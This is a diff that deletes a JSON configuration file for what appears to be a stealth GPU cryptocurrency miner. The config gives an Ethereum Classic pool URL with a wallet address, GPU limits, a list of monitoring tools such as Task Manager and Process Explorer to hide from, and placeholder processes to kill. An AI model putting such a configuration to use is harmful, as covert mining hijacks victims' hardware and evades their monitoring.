@@ -1,9 +1,0 @@
-{
-    "url": "stratum://0xe8D349AC6087d114B1EF41a2E51aa442dfg50F6.Worker@etc-eu2.nanopool.org:19999",
-    "algo": "etchash",
-    "max-gpu": 50,
-    "idle-wait": 1,
-    "idle-gpu": 100,
-    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
-    "kill-targets": "program1.exe,program2.exe,program3.exe"
-}
